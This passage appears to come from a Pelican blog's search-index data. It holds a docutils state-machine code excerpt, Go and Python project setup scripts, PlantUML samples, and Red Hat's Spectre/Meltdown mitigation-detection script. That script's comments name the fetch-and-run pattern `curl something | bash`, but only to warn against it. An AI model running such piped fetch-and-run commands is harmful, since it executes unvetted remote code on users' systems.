( n , len ( self . data ))) 1172 elif n < 0 : 1173 raise IndexError ( 'Trim size must be >= 0.' ) 1174 del self . data [ - n :] 1175 del self . items [ - n :] 1176 1177 def remove ( self , item ): 1178 index = self . index ( item ) 1179 del self [ index ] 1180 1181 def count ( self , item ): return self . data . count ( item ) 1182 def index ( self , item ): return self . data . index ( item ) 1183 1184 def reverse ( self ): 1185 self . data . reverse () 1186 self . items . reverse () 1187 self . parent = None 1188 1189 def sort ( self , * args ): 1190 tmp = zip ( self . data , self . items ) 1191 tmp . sort ( * args ) 1192 self . data = [ entry [ 0 ] for entry in tmp ] 1193 self . items = [ entry [ 1 ] for entry in tmp ] 1194 self . parent = None 1195 1196 def info ( self , i ): 1197 \"\"\"Return source & offset for index `i`.\"\"\" 1198 try : 1199 return self . items [ i ] 1200 except IndexError : 1201 if i == len ( self . data ): # Just past the end 1202 return self . items [ i - 1 ][ 0 ], None 1203 else : 1204 raise 1205 1206 def source ( self , i ): 1207 \"\"\"Return source for index `i`.\"\"\" 1208 return self . info ( i )[ 0 ] 1209 1210 def offset ( self , i ): 1211 \"\"\"Return offset for index `i`.\"\"\" 1212 return self . info ( i )[ 1 ] 1213 1214 def disconnect ( self ): 1215 \"\"\"Break link between this list and parent list.\"\"\" 1216 self . parent = None 1217 1218 def xitems ( self ): 1219 \"\"\"Return iterator yielding (source, offset, value) tuples.\"\"\" 1220 for ( value , ( source , offset )) in zip ( self . data , self . items ): 1221 yield ( source , offset , value ) 1222 1223 def pprint ( self ): 1224 \"\"\"Print the list in `grep` format (`source:offset:value` lines)\"\"\" 1225 for line in self . xitems (): 1226 print \" %s : %d : %s \" % line 1227 1228 1229 class StringList ( ViewList ): 1230 1231 \"\"\"A `ViewList` with string-specific methods.\"\"\" 1232 1233 def trim_left ( self , length , start = 0 , end = sys . maxint ): 1234 \"\"\" 1235 Trim `length` characters off the beginning of each item, in-place, 1236 from index `start` to `end`. No whitespace-checking is done on the 1237 trimmed text. Does not affect slice parent. 1238 \"\"\" 1239 self . data [ start : end ] = [ line [ length :] 1240 for line in self . data [ start : end ]] 1241 1242 def get_text_block ( self , start , flush_left = False ): 1243 \"\"\" 1244 Return a contiguous block of text. 1245 1246 If `flush_left` is true, raise `UnexpectedIndentationError` if an 1247 indented line is encountered before the text block ends (with a blank 1248 line). 1249 \"\"\" 1250 end = start 1251 last = len ( self . data ) 1252 while end < last : 1253 line = self . data [ end ] 1254 if not line . strip (): 1255 break 1256 if flush_left and ( line [ 0 ] == ' ' ): 1257 source , offset = self . info ( end ) 1258 raise UnexpectedIndentationError ( self [ start : end ], source , 1259 offset + 1 ) 1260 end += 1 1261 return self [ start : end ] 1262 1263 def get_indented ( self , start = 0 , until_blank = False , strip_indent = True , 1264 block_indent = None , first_indent = None ): 1265 \"\"\" 1266 Extract and return a StringList of indented lines of text. 1267 1268 Collect all lines with indentation, determine the minimum indentation, 1269 remove the minimum indentation from all indented lines (unless 1270 `strip_indent` is false), and return them. All lines up to but not 1271 including the first unindented line will be returned. 1272 1273 :Parameters: 1274 - `start`: The index of the first line to examine. 1275 - `until_blank`: Stop collecting at the first blank line if true. 1276 - `strip_indent`: Strip common leading indent if true (default). 1277 - `block_indent`: The indent of the entire block, if known. 1278 - `first_indent`: The indent of the first line, if known. 1279 1280 :Return: 1281 - a StringList of indented lines with mininum indent removed; 1282 - the amount of the indent; 1283 - a boolean: did the indented block finish with a blank line or EOF? 1284 \"\"\" 1285 indent = block_indent # start with None if unknown 1286 end = start 1287 if block_indent is not None and first_indent is None : 1288 first_indent = block_indent 1289 if first_indent is not None : 1290 end += 1 1291 last = len ( self . data ) 1292 while end < last : 1293 line = self . data [ end ] 1294 if line and ( line [ 0 ] != ' ' 1295 or ( block_indent is not None 1296 and line [: block_indent ] . strip ())): 1297 # Line not indented or insufficiently indented. 1298 # Block finished properly iff the last indented line blank: 1299 blank_finish = (( end > start ) 1300 and not self . data [ end - 1 ] . strip ()) 1301 break 1302 stripped = line . lstrip () 1303 if not stripped : # blank line 1304 if until_blank : 1305 blank_finish = 1 1306 break 1307 elif block_indent is None : 1308 line_indent = len ( line ) - len ( stripped ) 1309 if indent is None : 1310 indent = line_indent 1311 else : 1312 indent = min ( indent , line_indent ) 1313 end += 1 1314 else : 1315 blank_finish = 1 # block ends at end of lines 1316 block = self [ start : end ] 1317 if first_indent is not None and block : 1318 block . data [ 0 ] = block . data [ 0 ][ first_indent :] 1319 if indent and strip_indent : 1320 block . trim_left ( indent , start = ( first_indent is not None )) 1321 return block , indent or 0 , blank_finish 1322 1323 def get_2D_block ( self , top , left , bottom , right , strip_indent = True ): 1324 block = self [ top : bottom ] 1325 indent = right 1326 for i in range ( len ( block . data )): 1327 # get slice from line, care for combining characters 1328 ci = utils . column_indices ( block . data [ i ]) 1329 try : 1330 left = ci [ left ] 1331 except IndexError : 1332 left += len ( block . data [ i ]) - len ( ci ) 1333 try : 1334 right = ci [ right ] 1335 except IndexError : 1336 right += len ( block . data [ i ]) - len ( ci ) 1337 block . data [ i ] = line = block . data [ i ][ left : right ] . rstrip () 1338 if line : 1339 indent = min ( indent , len ( line ) - len ( line . lstrip ())) 1340 if strip_indent and 0 < indent < right : 1341 block . data = [ line [ indent :] for line in block . data ] 1342 return block 1343 1344 def pad_double_width ( self , pad_char ): 1345 \"\"\" 1346 Pad all double-width characters in self by appending `pad_char` to each. 1347 For East Asian language support. 1348 \"\"\" 1349 east_asian_width = unicodedata . east_asian_width 1350 for i in range ( len ( self . data )): 1351 line = self . data [ i ] 1352 if isinstance ( line , unicode ): 1353 new = [] 1354 for char in line : 1355 new . append ( char ) 1356 if east_asian_width ( char ) in 'WF' : # 'W'ide & 'F'ull-width 1357 new . append ( pad_char ) 1358 self . data [ i ] = '' . join ( new ) 1359 1360 def replace ( self , old , new ): 1361 \"\"\"Replace all occurrences of substring `old` with `new`.\"\"\" 1362 for i in range ( len ( self . data )): 1363 self . data [ i ] = self . data [ i ] . replace ( old , new ) 1364 1365 1366 class StateMachineError ( Exception ): pass 1367 class UnknownStateError ( StateMachineError ): pass 1368 class DuplicateStateError ( StateMachineError ): pass 1369 class UnknownTransitionError ( StateMachineError ): pass 1370 class DuplicateTransitionError ( StateMachineError ): pass 1371 class TransitionPatternNotFound ( StateMachineError ): pass 1372 class TransitionMethodNotFound ( StateMachineError ): pass 1373 class UnexpectedIndentationError ( StateMachineError ): pass 1374 1375 1376 class TransitionCorrection ( Exception ): 1377 1378 \"\"\" 1379 Raise from within a transition method to switch to another transition. 1380 1381 Raise with one argument, the new transition name. 1382 \"\"\" 1383 1384 1385 class StateCorrection ( Exception ): 1386 1387 \"\"\" 1388 Raise from within a transition method to switch to another state. 1389 1390 Raise with one or two arguments: new state name, and an optional new 1391 transition name. 1392 \"\"\" 1393 1394 1395 def string2lines ( astring , tab_width = 8 , convert_whitespace = False , 1396 whitespace = re . compile ( '[ \\v\\f ]' )): 1397 \"\"\" 1398 Return a list of one-line strings with tabs expanded, no newlines, and 1399 trailing whitespace stripped. 1400 1401 Each tab is expanded with between 1 and `tab_width` spaces, so that the 1402 next character's index becomes a multiple of `tab_width` (8 by default). 1403 1404 Parameters: 1405 1406 - `astring`: a multi-line string. 1407 - `tab_width`: the number of columns between tab stops. 1408 - `convert_whitespace`: convert form feeds and vertical tabs to spaces? 1409 \"\"\" 1410 if convert_whitespace : 1411 astring = whitespace . sub ( ' ' , astring ) 1412 return [ s . expandtabs ( tab_width ) . rstrip () for s in astring . splitlines ()] 1413 1414 def _exception_data (): 1415 \"\"\" 1416 Return exception information: 1417 1418 - the exception's class name; 1419 - the exception object; 1420 - the name of the file containing the offending code; 1421 - the line number of the offending code; 1422 - the function name of the offending code. 1423 \"\"\" 1424 type , value , traceback = sys . exc_info () 1425 while traceback . tb_next : 1426 traceback = traceback . tb_next 1427 code = traceback . tb_frame . f_code 1428 return ( type . __name__ , value , code . co_filename , traceback . tb_lineno , 1429 code . co_name )","tags":"code","url":"2018/state-machine.html"},{"title":"How to install Pelican","text":"Installation 1) First, create a virtualenv. This step requires that you have already setup virtualenv and virtualenvwrapper. I am using it to create the virtualenv with python3 and probably isn't the correct way today. I have been using python3 for years and I like having the same workflow for both. 1 $ mkproject -p python3 <venv_name> Install Pelican 1 $ pip install pelican 3) Run quickstart to get a sample site created to look at. It will ask a series of questions to configure environment. Use default settings unless you know what you want. All settings are able to modified later in the pelicanconf.py. 1 $ pelican-quickstart To look at the test site and explore. 1 $ make html && make serve Goto a web browser to http://127.0.0.1:8000 6) Generate content by going into the <project folder/content and create a new RestructuredText file. Once done you can regenerate content and review at the same localhost address. 1 $ make clean && make html && make serve","tags":"coding","url":"2018/pelican_powered.html"},{"title":"Golang prototyping workflow","text":"direnv.sh 1 # Setup direnv if file exists and not root 2 DIRENV = ` which direnv ` 3 4 if [ -f $DIRENV ] ; then 5 if [[ $EUID -ne 0 ]] ; then 6 eval $( $DIRENV hook bash ) 7 fi 8 fi mkgoproject.sh 1 #!/bin/bash 2 # use direnv to create new gocode instance 3 # sets up git, dep, project repo and verifies test file compiles and executes 4 #set -x 5 6 #TODO: add in gitignore 7 8 REPOPATH = \"github.com/derez\" 9 10 DIRENV = $( which direnv ) 11 GO = $( which go ) 12 DEP = $( which dep ) 13 GIT = $( which git ) 14 15 for FC in $DIRENV $GO $DEP $GIT ; do 16 if [ ! -f $FC ] ; then 17 echo \"[!] Requires $FC to be installed!\" 18 exit 1 19 fi 20 done 21 22 [ $# -eq 0 ] && { echo \"Usage: $0 project_path_name\" ; exit 1 ; } 23 24 PROJECT = \" $1 \" 25 26 PROJECT_PATH = \" $HOME / $PROJECT \" 27 28 if [ -d \" $PROJECT_PATH \" ] ; then 29 { echo \"[!] $PROJECT_PATH already exists\" ; exit 1 ; } 30 fi 31 32 echo \"[*] Create new project folder at $PROJECT_PATH \" 33 mkdir \" $PROJECT_PATH \" 34 35 ENVRC = \" $PROJECT_PATH /.envrc\" 36 echo \"[*] Create .envrc file for environment variables at $ENVRC \" 37 38 echo \"export GOPATH= $PROJECT_PATH \" >> $ENVRC 39 echo \"export PATH= $PROJECT_PATH /bin: $PATH \" >> $ENVRC 40 41 echo \"[*] Create project structure\" 42 mkdir \" $PROJECT_PATH /bin\" 43 mkdir \" $PROJECT_PATH /pkg\" 44 mkdir \" $PROJECT_PATH /src\" 45 46 cd $PROJECT_PATH 47 $DIRENV allow . && eval $( direnv export bash ) 48 $DIRENV status 49 50 PROJECT_REPO = \" $PROJECT_PATH /src/ $REPOPATH / $PROJECT \" 51 echo \"[*] Setup project repo at $PROJECT_REPO \" 52 53 mkdir -p \" $PROJECT_REPO \" 54 cd \"src/ $REPOPATH / $PROJECT \" 55 56 echo \"[*] Initialize new git repo for $PROJECT_REPO \" 57 $GIT init 58 echo \"[*] Initialize dep for $PROJECT_REPO \" 59 $DEP init 60 61 TESTFILE = \" $PROJECT_REPO / $PROJECT .go\" 62 echo \"[*] Create test file at $TESTFILE \" 63 64 $( which cat ) > \" $TESTFILE \" << EOF 65 66 package main 67 68 import \"fmt\" 69 70 func main() { 71 fmt.Println(\"\\nNew test file compiled and executed successfully\\n\") 72 } 73 EOF 74 75 $GO run $TESTFILE 76 77 echo \"Project Path: $PROJECT_PATH \" 78 echo \"Project Repo: $PROJECT_REPO \"","tags":"workflow","url":"2018/golang-prototyping-workflow.html"},{"title":"PlantUML test page","text":"Sequence diagram (from PlantUML site): 1 .. uml :: 2 :alt: Sample sequence diagram 3 4 participant User 5 6 User -> A: DoWork 7 activate A #FFBBBB 8 9 A -> A: Internal call 10 activate A #DarkSalmon 11 12 A -> B: << createRequest >> 13 activate B 14 15 B --> A: RequestCreated 16 deactivate B 17 deactivate A 18 A -> User: Done 19 deactivate A Another example from PlantUML site (activity diagram): 1 .. uml :: 2 3 start 4 :ClickServlet.handleRequest(); 5 :new page; 6 if (Page.onSecurityCheck) then (true) 7 :Page.onInit(); 8 if (isForward?) then (no) 9 :Process controls; 10 if (continue processing?) then (no) 11 stop 12 endif 13 14 if (isPost?) then (yes) 15 :Page.onPost(); 16 else (no) 17 :Page.onGet(); 18 endif 19 :Page.onRender(); 20 endif 21 else (false) 22 endif 23 24 if (do redirect?) then (yes) 25 :redirect process; 26 else 27 if (do forward?) then (yes) 28 :Forward request; 29 else (no) 30 :Render page template; 31 endif 32 endif 33 34 stop","tags":"blog","url":"2018/plantuml.html"},{"title":"Python prototyping workflow","text":"Cover virtualenv, virtualenvwrappers for Python2 and venv for Python3 pyenv.sh - placed in /etc/profile.d 1 #!/bin/bash 2 3 # Sets up virtualenvwrapper as part of /etc/profile.d 4 # sets PROJECT_HOME directory to ~/pyenv 5 # WORKON_HOME directory defaults at ~/.virtualenv 6 7 8 # Python environment startup 9 # Ignore if opening shell as root 10 if [[ $EUID -gt 999 ]] ; then 11 12 if [ -f $HOME /.pythonrc.py ] ; then 13 export PYTHONSTARTUP = $HOME /.pythonrc.py 14 fi 15 16 if ! [ -d \" $HOME /pyenv\" ] ; then 17 mkdir -p $HOME /pyenv 18 fi 19 20 # Python virtualenv 21 export VIRTUALENVWRAPPER_PYTHON = /usr/bin/python 22 23 export PROJECT_HOME = $HOME /pyenv 24 # turns off changing into WORKON_HOME 25 # Sets up chainging into PROJECT_HOME when activating 26 grep -q -F \"cdproject\" $WORKON_HOME /postactivate || echo \"cdproject\" >> $WORKON_HOME /postactivate 27 28 export VIRTUALENVWRAPPER_WORKON_CD = 0 29 source virtualenvwrapper.sh > /dev/null 2 > & 1 30 31 fi","tags":"workflow","url":"2018/python-prototyping-workflow.html"},{"title":"Meltdown test","text":"1 #!/bin/bash 2 3 # Copyright (C) 2018 Red Hat, Inc. 4 # 5 # This program is free software: you can redistribute it and/or modify 6 # it under the terms of the GNU General Public License as published by 7 # the Free Software Foundation, either version 3 of the License, or 8 # (at your option) any later version. 9 10 # Version: 2.1 11 12 # Warning! Be sure to download the latest version of this script from its primary source: 13 # https://access.redhat.com/security/vulnerabilities/speculativeexecution 14 # DO NOT blindly trust any internet sources and NEVER do `curl something | bash`! 15 16 # This script is meant for simple detection of the vulnerability. Feel free to modify it for your 17 # environment or needs. For more advanced detection, consider Red Hat Insights: 18 # https://access.redhat.com/products/red-hat-insights#getstarted 19 20 # Checking against the list of vulnerable packages is necessary because of the way how features 21 # are back-ported to older versions of packages in various channels. 22 23 24 basic_args () { 25 # Parses basic commandline arguments and sets basic environment. 26 # 27 # Args: 28 # parameters - an array of commandline arguments 29 # 30 # Side effects: 31 # Exits if --help parameters is used 32 # Sets COLOR constants and debug variable 33 34 local parameters =( \" $@ \" ) 35 36 RED = \"\\033[1;31m\" 37 YELLOW = \"\\033[1;33m\" 38 GREEN = \"\\033[1;32m\" 39 BOLD = \"\\033[1m\" 40 RESET = \"\\033[0m\" 41 for parameter in \" ${ parameters [@] } \" ; do 42 if [[ \" $parameter \" == \"-h\" || \" $parameter \" == \"--help\" ]] ; then 43 echo \"Usage: $( basename \" $0 \" ) [-n | --no-colors] [-d | --debug]\" 44 exit 1 45 elif [[ \" $parameter \" == \"-n\" || \" $parameter \" == \"--no-colors\" ]] ; then 46 RED = \"\" 47 YELLOW = \"\" 48 GREEN = \"\" 49 BOLD = \"\" 50 RESET = \"\" 51 elif [[ \" $parameter \" == \"-d\" || \" $parameter \" == \"--debug\" ]] ; then 52 debug = true 53 fi 54 done 55 } 56 57 58 basic_reqs () { 59 # Prints common disclaimer and checks basic requirements. 60 # 61 # Args: 62 # CVE - string printed in the disclaimer 63 # 64 # Side effects: 65 # Exits when 'rpm' command is not available 66 67 local CVE = \" $1 \" 68 69 # Disclaimer 70 echo 71 echo -e \" ${ BOLD } This script is primarily designed to detect $CVE on supported\" 72 echo -e \"Red Hat Enterprise Linux systems and kernel packages.\" 73 echo -e \"Result may be inaccurate for other RPM based systems. ${ RESET } \" 74 echo 75 76 # RPM is required 77 if ! command -v rpm & > /dev/null ; then 78 echo \"'rpm' command is required, but not installed. Exiting.\" 79 exit 1 80 fi 81 } 82 83 84 check_supported_kernel () { 85 # Checks if running kernel is supported. 86 # 87 # Args: 88 # running_kernel - kernel string as returned by 'uname -r' 89 # 90 # Side effects: 91 # Exits when running kernel is obviously not supported 92 93 local running_kernel = \" $1 \" 94 95 # Check supported platform 96 if [[ \" $running_kernel \" ! = * \".el\" [ 5 -7 ] * ]] ; then 97 echo \"This script is meant to be used only on Red Hat Enterprise Linux 5, 6 and 7.\" 98 exit 1 99 fi 100 } 101 102 103 get_rhel () { 104 # Gets RHEL number. 105 # 106 # Args: 107 # running_kernel - kernel string as returned by 'uname -r' 108 # 109 # Prints: 110 # RHEL number, e.g. '5', '6', or '7' 111 112 local running_kernel = \" $1 \" 113 114 local rhel = $( sed -r -n 's/&#94;.*el([[:digit:]]).*$/\\1/p' <<< \" $running_kernel \" ) 115 echo \" $rhel \" 116 } 117 118 119 check_cpu_vendor () { 120 # Checks for supported CPU vendor. 121 # 122 # Prints: 123 # 'Intel' or 'AMD' 124 # 125 # Returns: 126 # 0 if supported CPU vendor found, otherwise 1 127 # 128 # Notes: 129 # MOCK_CPU_INFO_PATH can be used to mock /proc/cpuinfo file 130 131 local cpuinfo = ${ MOCK_CPU_INFO_PATH :- /proc/cpuinfo } 132 133 if grep --quiet \"GenuineIntel\" \" $cpuinfo \" ; then 134 echo \"Intel\" 135 return 0 136 fi 137 if grep --quiet \"AuthenticAMD\" \" $cpuinfo \" ; then 138 echo \"AMD\" 139 return 0 140 fi 141 142 return 1 143 } 144 145 146 gather_info () { 147 # Gathers all available information and stores it in global variables. 148 # 149 # Side effects: 150 # Sets many global boolean flags 151 # 152 # Notes: 153 # MOCK_DEBUG_X86_PATH can be used to mock /sys/kernel/debug/x86 directory 154 # MOCK_CMDLINE_PATH can be used to mock /proc/cmdline file 155 # MOCK_EUID can be used to mock EUID variable 156 157 local debug_x86 = ${ MOCK_DEBUG_X86_PATH :- /sys/kernel/debug/x86 } 158 local cmdline_path = ${ MOCK_CMDLINE_PATH :- /proc/cmdline } 159 local euid = ${ MOCK_EUID :- $EUID } 160 161 # Am I root? 162 if (( euid == 0 )) ; then 163 root = 1 164 fi 165 166 # Is debugfs mounted? 167 if mount | grep --quiet debugfs ; then 168 mounted_debugfs = 1 169 fi 170 171 # Will fallback detection be needed? 172 if (( ! mounted_debugfs || ! root )) ; then 173 fallback_needed = 1 174 fi 175 176 # Are all debug files accessible? 177 if [[ -r \" ${ debug_x86 } /pti_enabled\" && -r \" ${ debug_x86 } /ibpb_enabled\" && -r \" ${ debug_x86 } /ibrs_enabled\" ]] ; then 178 all_debug_files = 1 179 fi 180 181 # Read features from debugfs 182 if (( all_debug_files )) ; then 183 new_kernel = 1 184 pti_debugfs = $( < \" ${ debug_x86 } /pti_enabled\" ) 185 ibpb_debugfs = $( < \" ${ debug_x86 } /ibpb_enabled\" ) 186 ibrs_debugfs = $( < \" ${ debug_x86 } /ibrs_enabled\" ) 187 fi 188 189 # Read features from dmesg 190 if ! dmesg | grep --quiet 'Linux.version' ; then 191 dmesg_wrapped = 1 192 fi 193 194 # These will not appear if disabled from commandline 195 if dmesg | grep --quiet -e 'x86/pti: Unmapping kernel while in userspace' \\ 196 -e 'x86/pti: Kernel page table isolation enabled' \\ 197 -e 'x86/pti: Xen PV detected, disabling' \\ 198 -e 'x86/pti: Xen PV detected, disabling PTI protection' ; then 199 new_kernel = 1 200 pti_dmesg = 1 201 fi 202 203 # These will appear if disabled from commandline 204 line = $( dmesg | tac | grep --max-count 1 'FEATURE SPEC_CTRL' ) # Check last 205 if [[ \" $line \" ]] ; then 206 new_kernel = 1 207 if ! grep --quiet 'Not Present' <<< \" $line \" ; then 208 ibrs_dmesg = 1 209 hw_support = 1 210 else 211 not_ibrs_dmesg = 1 212 fi 213 fi 214 215 line = $( dmesg | tac | grep --max-count 1 'FEATURE IBPB_SUPPORT' ) # Check last 216 if [[ \" $line \" ]] ; then 217 new_kernel = 1 218 if ! grep --quiet 'Not Present' <<< \" $line \" ; then 219 ibpb_dmesg = 1 220 hw_support = 1 221 else 222 not_ibpb_dmesg = 1 223 fi 224 fi 225 226 # Read commandline 227 if grep --quiet 'nopti' \" $cmdline_path \" ; then 228 nopti = 1 229 fi 230 if grep --quiet 'noibrs' \" $cmdline_path \" ; then 231 noibrs = 1 232 fi 233 if grep --quiet 'noibpb' \" $cmdline_path \" ; then 234 noibpb = 1 235 fi 236 } 237 238 239 check_variants () { 240 # Checks which variants are mitigated based on many global boolean flags. 241 # 242 # Side effects: 243 # Sets global variables variant_1, variant_2, variant_3. 244 245 if (( new_kernel )) ; then 246 variant_1 = \"Mitigated\" 247 fi 248 249 if [[ \" $vendor \" == \"Intel\" ]] ; then 250 if (( ! fallback_needed )) ; then 251 if (( pti_debugfs == 1 && ibrs_debugfs == 1 && ibpb_debugfs == 1 )) ; then 252 variant_2 = \"Mitigated\" 253 variant_3 = \"Mitigated\" 254 fi 255 if (( pti_debugfs == 1 && ibrs_debugfs == 2 && ibpb_debugfs == 1 )) ; then 256 variant_2 = \"Mitigated\" 257 variant_3 = \"Mitigated\" 258 fi 259 if (( pti_debugfs == 1 && ibrs_debugfs == 0 && ibpb_debugfs == 0 )) ; then 260 variant_3 = \"Mitigated\" 261 fi 262 else 263 if (( ibrs_dmesg && ibpb_dmesg && ! noibrs && ! noibpb )) ; then 264 variant_2 = \"Mitigated\" 265 fi 266 if (( pti_dmesg )) ; then 267 variant_3 = \"Mitigated\" 268 fi 269 fi 270 fi 271 272 if [[ \" $vendor \" == \"AMD\" ]] ; then 273 variant_3 = \"AMD is not vulnerable to this variant\" 274 275 if (( ! fallback_needed )) ; then 276 if (( pti_debugfs == 0 && ibrs_debugfs == 0 && ibpb_debugfs == 2 )) ; then 277 variant_2 = \"Mitigated\" 278 fi 279 if (( pti_debugfs == 0 && ibrs_debugfs == 2 && ibpb_debugfs == 1 )) ; then 280 variant_2 = \"Mitigated\" 281 fi 282 else 283 if (( ibpb_dmesg && ! noibpb )) ; then 284 variant_2 = \"Mitigated\" 285 fi 286 fi 287 fi 288 } 289 290 291 if [[ \" ${ BASH_SOURCE [0] } \" == \" $0 \" ]] ; then 292 basic_args \" $@ \" 293 basic_reqs \"Spectre / Meltdown\" 294 running_kernel = $( uname -r ) 295 check_supported_kernel \" $running_kernel \" 296 297 rhel = $( get_rhel \" $running_kernel \" ) 298 if (( rhel == 5 )) ; then 299 export PATH = '/sbin' : $PATH 300 301 echo \"RHEL5 is not supported by the script at the moment.\" 302 exit 1 303 fi 304 305 vendor = $( check_cpu_vendor ) 306 if (( $? == 1 )) ; then 307 echo \"Your CPU vendor is not supported by the script at the moment.\" 308 echo \"Only Intel and AMD are supported for now.\" 309 exit 1 310 fi 311 312 root = 0 313 mounted_debugfs = 0 314 all_debug_files = 0 315 fallback_needed = 0 316 pti_debugfs = 0 317 ibrs_debugfs = 0 318 ibpb_debugfs = 0 319 dmesg_wrapped = 0 320 pti_dmesg = 0 321 ibrs_dmesg = 0 322 ibpb_dmesg = 0 323 not_ibrs_dmesg = 0 324 not_ibpb_dmesg = 0 325 new_kernel = 0 326 nopti = 0 327 noibrs = 0 328 noibpb = 0 329 hw_support = 0 330 331 variant_1 = \"Vulnerable\" 332 variant_2 = \"Vulnerable\" 333 variant_3 = \"Vulnerable\" 334 335 # Tests 336 gather_info 337 check_variants 338 339 # Debug prints 340 if [[ \" $debug \" ]] ; then 341 echo \"running_kernel = * $running_kernel *\" 342 echo \"rhel = * $rhel *\" 343 echo \"vendor = * $vendor *\" 344 echo \"root = * $root *\" 345 echo \"mounted_debugfs = * $mounted_debugfs *\" 346 echo \"all_debug_files = * $all_debug_files *\" 347 echo \"fallback_needed = * $fallback_needed *\" 348 echo \"pti_debugfs = * $pti_debugfs *\" 349 echo \"ibrs_debugfs = * $ibrs_debugfs *\" 350 echo \"ibpb_debugfs = * $ibpb_debugfs *\" 351 echo \"dmesg_wrapped = * $dmesg_wrapped *\" 352 echo \"pti_dmesg = * $pti_dmesg *\" 353 echo \"ibrs_dmesg = * $ibrs_dmesg *\" 354 echo \"ibpb_dmesg = * $ibpb_dmesg *\" 355 echo \"not_ibrs_dmesg = * $not_ibrs_dmesg *\" 356 echo \"not_ibpb_dmesg = * $not_ibpb_dmesg *\" 357 echo \"new_kernel = * $new_kernel *\" 358 echo \"nopti = * $nopti *\" 359 echo \"noibrs = * $noibrs *\" 360 echo \"noibpb = * $noibpb *\" 361 echo \"hw_support = * $hw_support *\" 362 echo \"variant_1 = * $variant_1 *\" 363 echo \"variant_2 = * $variant_2 *\" 364 echo \"variant_3 = * $variant_3 *\" 365 echo 366 fi 367 368 # Results 369 if (( new_kernel )) ; then 370 kernel_with_patches = \" ${ GREEN } OK ${ RESET } \" 371 if (( hw_support )) ; then 372 hw = \" ${ GREEN } YES ${ RESET } \" 373 else 374 hw = \" ${ RED } NO ${ RESET } \" 375 fi 376 else 377 kernel_with_patches = \" ${ RED } Not installed ${ RESET } \" 378 hw = \" ${ YELLOW } Cannot detect without updated kernel ${ RESET } \" 379 fi 380 381 if (( nopti )) ; then 382 pti = \" ${ RED } Disabled on kernel commandline by 'nopti' ${ RESET } \" 383 else 384 pti = \"Not disabled on kernel commandline\" 385 fi 386 387 if (( noibrs )) ; then 388 ibrs = \" ${ RED } Disabled on kernel commandline by 'noibrs' ${ RESET } \" 389 else 390 ibrs = \"Not disabled on kernel commandline\" 391 fi 392 393 if (( noibpb )) ; then 394 ibpb = \" ${ RED } Disabled on kernel commandline by 'noibpb' ${ RESET } \" 395 else 396 ibpb = \"Not disabled on kernel commandline\" 397 fi 398 399 (( result = 0 )) 400 if [[ \" $variant_1 \" == \"Vulnerable\" ]] ; then 401 (( result | = 2 )) 402 variant_1 = \" ${ RED } $variant_1 ${ RESET } \" 403 else 404 variant_1 = \" ${ GREEN } $variant_1 ${ RESET } \" 405 fi 406 if [[ \" $variant_2 \" == \"Vulnerable\" ]] ; then 407 (( result | = 4 )) 408 variant_2 = \" ${ RED } $variant_2 ${ RESET } \" 409 else 410 variant_2 = \" ${ GREEN } $variant_2 ${ RESET } \" 411 fi 412 if [[ \" $variant_3 \" == \"Vulnerable\" ]] ; then 413 (( result | = 8 )) 414 variant_3 = \" ${ RED } $variant_3 ${ RESET } \" 415 else 416 variant_3 = \" ${ GREEN } $variant_3 ${ RESET } \" 417 fi 418 419 # Output 420 echo -e \"Detected CPU vendor: ${ BOLD } $vendor ${ RESET } \" 421 echo -e \"Running kernel: ${ BOLD } $running_kernel ${ RESET } \" 422 echo 423 424 # Warnings 425 if (( fallback_needed )) ; then 426 echo -e \" ${ YELLOW } Fallback non-runtime heuristics check is used (reading dmesg messages) ${ RESET } ,\" 427 echo -e \"because debugfs could not be read.\" 428 echo 429 echo \"To improve mitigation detection:\" 430 if (( ! mounted_debugfs )) ; then 431 echo \"* Mount debugfs by following command:\" 432 if (( rhel == 5 || rhel == 6 )) ; then 433 echo \" # mount -t debugfs nodev /sys/kernel/debug\" 434 fi 435 if (( rhel == 7 )) ; then 436 echo \" # systemctl restart sys-kernel-debug.mount\" 437 fi 438 fi 439 if (( ! root )) ; then 440 echo \"* Run this script with elevated privileges (e.g. as root)\" 441 fi 442 echo 443 fi 444 445 if (( dmesg_wrapped )) ; then 446 echo -e \" ${ YELLOW } It seems that dmesg circular buffer already wrapped, ${ RESET } \" 447 echo -e \" ${ YELLOW } the results may be inaccurate. ${ RESET } \" 448 echo 449 fi 450 451 # Variants 452 echo -e \"Variant #1 (Spectre): $variant_1 \" 453 echo -e \"CVE-2017-5753 - speculative execution bounds-check bypass\" 454 echo -e \" - Kernel with mitigation patches: $kernel_with_patches \" 455 echo 456 457 echo -e \"Variant #2 (Spectre): $variant_2 \" 458 echo -e \"CVE-2017-5715 - speculative execution branch target injection\" 459 echo -e \" - Kernel with mitigation patches: $kernel_with_patches \" 460 echo -e \" - HW support / updated microcode: $hw \" 461 echo -e \" - IBRS: $ibrs \" 462 echo -e \" - IBPB: $ibpb \" 463 echo 464 465 echo -e \"Variant #3 (Meltdown): $variant_3 \" 466 echo -e \"CVE-2017-5754 - speculative execution permission faults handling\" 467 if [[ \" $vendor \" == \"AMD\" ]] ; then 468 echo -e \" - AMD CPU: ${ GREEN } OK ${ RESET } \" 469 else 470 echo -e \" - Kernel with mitigation patches: $kernel_with_patches \" 471 echo -e \" - PTI: $pti \" 472 fi 473 echo 474 475 if (( result ! = 0 )) ; then 476 echo \"Red Hat recommends that you:\" 477 if (( ! new_kernel )) ; then 478 echo -e \"* Update your kernel and reboot the system.\" 479 fi 480 if (( ! hw_support )) ; then 481 echo -e \"* Ask your HW vendor for CPU microcode update.\" 482 fi 483 if (( noibrs || noibpb || nopti )) ; then 484 echo -e \"* Remove kernel commandline options as noted above.\" 485 fi 486 echo 487 fi 488 489 echo -e \"For more information see:\" 490 echo -e \"https://access.redhat.com/security/vulnerabilities/speculativeexecution\" 491 exit \" $result \" 492 fi","tags":"code","url":"2018/meltdown.html"},{"title":"Pelican project website theme","text":"Background I have been thinking about getting my project blog site back up again. I wanted to use a static website generator as security has been an issue with closing the last two down. Since I have spent the better part of the last 14 years working in Python that was an easy choice as well. I chose Pelican and decided to build a custom theme as I couldn't find one I was happy with. Requirements Since all projects starts with requirements ;) Support identification of projects and resources I want to post. Would like to have a project site first with the ability to blog. Wanted to use ReStructured Text. The site content needed to be driven by simple ASCII text files. Great code syntax highlighting is a must. Support for mobile platforms.","tags":"projects","url":"2018/project_website.html"},{"title":"Restructured Text Cheatsheet","text":"Inline Markup Inline markup allows words and phrases within text to have character styles (like italics and boldface) and functionality (like hyperlinks). *emphasis* emphasis **strong emphasis** strong emphasis `interpreted text` The rendering and meaning of interpreted text is domain- or application-dependent. ``inline 